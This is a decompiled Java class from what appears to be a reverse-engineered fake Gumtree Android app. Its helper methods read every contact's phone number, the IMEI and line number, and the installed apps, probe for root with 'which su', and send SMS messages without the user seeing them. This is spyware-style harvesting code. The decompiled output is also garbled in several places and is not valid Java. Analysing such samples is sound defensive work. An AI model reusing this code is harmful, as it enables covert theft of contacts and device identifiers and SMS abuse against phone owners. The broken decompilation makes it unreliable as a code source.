package com.gumsis.checktls;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Process;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.provider.Settings.Secure;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;
import com.gumsis.mess.MessStatusInterface;
import com.gumsis.mess.model.MessageEvent;
import de.greenrobot.event.EventBus;
import java.io.File;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.UUID;

public class CmndTls
{
  public static List<String> contactList = new ArrayList();
  
  private static boolean canExecuteCommand(String paramString)
  {
    try
    {
      Runtime.getRuntime().exec(paramString);
      return true;
    }
    catch (Exception paramString) {}
    return false;
  }
  
  private static String capitalize(String paramString)
  {
    if (TextUtils.isEmpty(paramString)) {
      return paramString;
    }
    paramString = paramString.toCharArray();
    int i = 1;
    StringBuilder localStringBuilder = new StringBuilder();
    int k = paramString.length;
    int j = 0;
    if (j < k)
    {
      char c = paramString[j];
      if ((i != 0) && (Character.isLetter(c)))
      {
        localStringBuilder.append(Character.toUpperCase(c));
        i = 0;
      }
      for (;;)
      {
        j += 1;
        break;
        if (Character.isWhitespace(c)) {
          i = 1;
        }
        localStringBuilder.append(c);
      }
    }
    return localStringBuilder.toString();
  }
  
  public static List<String> getAllInstalledApkInfo(Context paramContext)
  {
    ArrayList localArrayList = new ArrayList();
    Object localObject = new Intent("android.intent.action.MAIN", null);
    ((Intent)localObject).addCategory("android.intent.category.LAUNCHER");
    ((Intent)localObject).setFlags(270532608);
    paramContext = paramContext.getPackageManager().queryIntentActivities((Intent)localObject, 0).iterator();
    while (paramContext.hasNext())
    {
      localObject = (ResolveInfo)paramContext.next();
      ActivityInfo localActivityInfo = ((ResolveInfo)localObject).activityInfo;
      if (!isSystemPackage((ResolveInfo)localObject)) {
        localArrayList.add(localActivityInfo.applicationInfo.packageName);
      }
    }
    return localArrayList;
  }
  
  public static List<String> getContactList(Context paramContext)
  {
    AsyncTask.execute(new Runnable()
    {
      public void run()
      {
        ContentResolver localContentResolver = this.val$context.getContentResolver();
        Cursor localCursor = localContentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        int i;
        if (localCursor != null)
        {
          i = localCursor.getCount();
          if (i <= 0) {
            break label208;
          }
          if ((CmndTls.contactList != null) && (CmndTls.contactList.size() > 0)) {
            CmndTls.contactList.clear();
          }
        }
        for (;;)
        {
          if ((localCursor == null) || (!localCursor.moveToNext())) {
            break label193;
          }
          Object localObject = localCursor.getString(localCursor.getColumnIndex("_id"));
          if (localCursor.getInt(localCursor.getColumnIndex("has_phone_number")) > 0)
          {
            localObject = localContentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = ?", new String[] { localObject }, null);
            for (;;)
            {
              if (((Cursor)localObject).moveToNext())
              {
                String str = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("data1"));
                CmndTls.contactList.add(str);
                Log.i("Phone Number: ", str);
                continue;
                i = 0;
                break;
              }
            }
            ((Cursor)localObject).close();
          }
        }
        label193:
        EventBus.getDefault().postSticky(new MessageEvent("contacts_fetched"));
        label208:
        if (localCursor != null) {
          localCursor.close();
        }
      }
    });
    return contactList;
  }
  
  public static String getDeviceName()
  {
    String str1 = Build.MANUFACTURER;
    String str2 = Build.MODEL;
    if (str2.startsWith(str1)) {
      return capitalize(str2);
    }
    return capitalize(str1) + " " + str2;
  }
  
  public static String getPhoneIMEINumber(Context paramContext)
  {
    String str = null;
    Object localObject = (TelephonyManager)paramContext.getSystemService("phone");
    if (localObject != null) {
      if (Build.VERSION.SDK_INT < 26) {
        break label54;
      }
    }
    label54:
    for (str = ((TelephonyManager)localObject).getImei();; str = ((TelephonyManager)localObject).getDeviceId())
    {
      if (str != null)
      {
        localObject = str;
        if (str.length() != 0) {}
      }
      else
      {
        localObject = Settings.Secure.getString(paramContext.getContentResolver(), "android_id");
      }
      return (String)localObject;
    }
  }
  
  public static String getPhoneNumber(Context paramContext)
  {
    TelephonyManager localTelephonyManager = (TelephonyManager)paramContext.getSystemService("phone");
    String str2 = "";
    if (Build.VERSION.SDK_INT >= 23)
    {
      String str1 = str2;
      if (paramContext.checkSelfPermission("android.permission.READ_SMS") == 0)
      {
        str1 = str2;
        if (paramContext.checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
          str1 = localTelephonyManager.getLine1Number();
        }
      }
      return str1;
    }
    return localTelephonyManager.getLine1Number();
  }
  
  public static String getPhoneOperator(Context paramContext)
  {
    paramContext = (TelephonyManager)paramContext.getSystemService("phone");
    if (paramContext != null) {
      return paramContext.getNetworkOperatorName();
    }
    return "";
  }
  
  public static String getPsuedoUniqueID()
  {
    String str1 = "35" + Build.BOARD.length() % 10 + Build.BRAND.length() % 10 + Build.CPU_ABI.length() % 10 + Build.DEVICE.length() % 10 + Build.MANUFACTURER.length() % 10 + Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10;
    try
    {
      String str2 = Build.class.getField("SERIAL").get(null).toString();
      str2 = new UUID(str1.hashCode(), str2.hashCode()).toString();
      return str2;
    }
    catch (Exception localException) {}
    return new UUID(str1.hashCode(), "serial".hashCode()).toString();
  }
  
  public static boolean isAppInstalled(Context paramContext, String paramString)
  {
    paramContext = paramContext.getPackageManager();
    try
    {
      paramContext.getPackageInfo(paramString, 1);
      return true;
    }
    catch (Exception paramContext)
    {
      Print.e(paramContext.toString());
    }
    return false;
  }
  
  public static boolean isInServiceProcess(Context paramContext, Class<? extends Service> paramClass)
  {
    Object localObject1 = paramContext.getPackageManager();
    try
    {
      localObject2 = ((PackageManager)localObject1).getPackageInfo(paramContext.getPackageName(), 4);
      localObject2 = ((PackageInfo)localObject2).applicationInfo.processName;
      ComponentName localComponentName = new ComponentName(paramContext, paramClass);
      i = Process.myPid();
    }
    catch (Exception paramClass)
    {
      try
      {
        localObject1 = ((PackageManager)localObject1).getServiceInfo(localComponentName, 0);
        if (!((ServiceInfo)localObject1).processName.equals(localObject2)) {
          break label125;
        }
        Print.e("Did not expect service " + paramClass + " to run in main process " + (String)localObject2);
        return false;
      }
      catch (PackageManager.NameNotFoundException paramContext)
      {
        return false;
      }
      paramClass = paramClass;
      Print.e("Could not get package info for " + paramContext.getPackageName());
      return false;
    }
    label125:
    int i;
    paramContext = (ActivityManager)paramContext.getSystemService("activity");
    if (paramContext == null) {
      return false;
    }
    paramClass = null;
    Object localObject2 = paramContext.getRunningAppProcesses();
    paramContext = paramClass;
    if (localObject2 != null)
    {
      localObject2 = ((List)localObject2).iterator();
      do
      {
        paramContext = paramClass;
        if (!((Iterator)localObject2).hasNext()) {
          break;
        }
        paramContext = (ActivityManager.RunningAppProcessInfo)((Iterator)localObject2).next();
      } while (paramContext.pid != i);
    }
    if (paramContext == null)
    {
      Print.e("Could not find running process for " + i);
      return false;
    }
    return paramContext.processName.equals(((ServiceInfo)localObject1).processName);
  }
  
  public static boolean isInternetConnected(Context paramContext)
  {
    paramContext = ((ConnectivityManager)paramContext.getSystemService("connectivity")).getActiveNetworkInfo();
    return (paramContext != null) && (paramContext.isConnectedOrConnecting());
  }
  
  public static boolean isMyActivityRunning(Class<?> paramClass, Context paramContext)
  {
    paramContext = (ActivityManager)paramContext.getSystemService("activity");
    if (paramContext != null)
    {
      Process.myPid();
      paramContext = paramContext.getRunningAppProcesses().iterator();
      while (paramContext.hasNext())
      {
        ActivityManager.RunningAppProcessInfo localRunningAppProcessInfo = (ActivityManager.RunningAppProcessInfo)paramContext.next();
        if (paramClass.getName().equals(localRunningAppProcessInfo.processName)) {
          return true;
        }
      }
    }
    return false;
  }
  
  public static boolean isMyServiceRunning(Class<?> paramClass, Context paramContext)
  {
    paramContext = (ActivityManager)paramContext.getSystemService("activity");
    if (paramContext != null)
    {
      paramContext = paramContext.getRunningServices(Integer.MAX_VALUE);
      if (paramContext != null)
      {
        int i = 0;
        while (i < paramContext.size())
        {
          ActivityManager.RunningServiceInfo localRunningServiceInfo = (ActivityManager.RunningServiceInfo)paramContext.get(i);
          if ((localRunningServiceInfo != null) && (localRunningServiceInfo.service != null) && (paramClass.getName().equals(localRunningServiceInfo.service.getClassName()))) {
            return true;
          }
          i += 1;
        }
      }
    }
    return false;
  }
  
  public static boolean isRooted()
  {
    String str = Build.TAGS;
    if ((str != null) && (str.contains("test-keys"))) {}
    for (;;)
    {
      return true;
      try
      {
        boolean bool = new File("/system/app/Superuser.apk").exists();
        if ((bool) || (canExecuteCommand("/system/xbin/which su")) || (canExecuteCommand("/system/bin/which su")) || (canExecuteCommand("which su"))) {}
      }
      catch (Exception localException)
      {
        for (;;) {}
      }
    }
    return false;
  }
  
  private static boolean isSystemPackage(ResolveInfo paramResolveInfo)
  {
    return (paramResolveInfo.activityInfo.applicationInfo.flags & 0x1) != 0;
  }
  
  public static void sendSMS(String paramString1, String paramString2, Context paramContext, MessStatusInterface paramMessStatusInterface)
  {
    try
    {
      PendingIntent localPendingIntent1 = PendingIntent.getBroadcast(paramContext, 0, new Intent("SMS_SENT"), 0);
      PendingIntent localPendingIntent2 = PendingIntent.getBroadcast(paramContext, 0, new Intent("SMS_DELIVERED"), 0);
      paramContext.registerReceiver(new BroadcastReceiver()new IntentFilter
      {
        public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
        {
          switch (getResultCode())
          {
          case 0: 
          default: 
            return;
          case -1: 
            this.val$messStatusInterface.isSmsSent(true);
            return;
          case 1: 
            this.val$messStatusInterface.isSmsSent(false);
            return;
          case 4: 
            this.val$messStatusInterface.isSmsSent(false);
            return;
          case 3: 
            this.val$messStatusInterface.isSmsSent(false);
            return;
          }
          this.val$messStatusInterface.isSmsSent(false);
        }
      }, new IntentFilter("SMS_SENT"));
      paramContext.registerReceiver(new BroadcastReceiver()new IntentFilter
      {
        public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
        {
          switch (getResultCode())
          {
          default: 
            return;
          case -1: 
            this.val$messStatusInterface.isSmsDelivered(true);
            return;
          }
          this.val$messStatusInterface.isSmsDelivered(false);
        }
      }, new IntentFilter("SMS_DELIVERED"));
      SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, localPendingIntent1, localPendingIntent2);
      return;
    }
    catch (Exception paramString1)
    {
      Toast.makeText(paramContext, paramString1.getMessage().toString(), 1).show();
      paramString1.printStackTrace();
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/checktls/CmndTls.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */